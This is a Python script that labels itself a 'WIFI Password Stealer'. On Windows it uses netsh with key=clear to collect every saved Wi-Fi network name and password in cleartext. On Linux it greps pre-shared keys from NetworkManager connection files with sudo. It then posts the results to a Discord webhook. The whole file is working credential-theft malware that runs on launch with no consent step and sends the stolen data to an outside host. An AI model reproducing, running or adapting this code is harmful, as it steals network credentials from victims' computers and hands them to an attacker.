import re
import subprocess
import sys
import requests
import getpass
import os

OS = ''
COMMAND_WINDOWS = "netsh wlan show profile"
COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'

url = "https://discordapp.com/api/webhooks/example" #set webhook

def identify():
    global OS
    OS = sys.platform

def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        env = os.environ
    else:
        si = None
        env = None
		
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}
		
    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret

def get_passwords():
    dataToBeSent = {}
    dataList = []

    if OS == 'win32':

        output = subprocess.check_output(COMMAND_WINDOWS,**subprocess_args(False)).decode('ascii').split('\n')
        SSID = list()
        for name in output:
            try:
                Name = name.split(':')[1].strip()  
                SSID.append(Name)
            except:
                pass

        for ssid in SSID:
            try:
                Password = subprocess.check_output(COMMAND_WINDOWS + ' name="' + ssid + '" key=clear',**subprocess_args(False)).decode('ascii')
                PSK = re.findall('Key Content(.*)\n', Password)[0].strip().split(':')[1].strip()
                temp = {}
                temp["ssid"] = ssid
                temp["pass"] = PSK
                dataList.append(temp)
            except:
                pass

    elif OS == "linux" or OS == "linux2" or OS == "linux3":
        output = subprocess.check_output(COMMAND_LINUX, shell=True).decode('utf-8').split('\n')
        for pair in output:
            try:
                pair = re.findall(RE_LINUX, pair)[0].split(':')
                ssid = pair[0]
                psk = pair[1].split('=')[1]
                temp = {}
                temp["ssid"] = ssid
                temp["pass"] = psk
                dataList.append(temp)

            except:
                pass

    dataToBeSent["passwords"] = dataList
    return dataToBeSent

def send():
    jsonData = get_passwords()
    #print(jsonData)
    send = requests.post(url, {
    'username': 'WIFI Password Stealer',
    'content': str(jsonData),
    })

identify()
send()
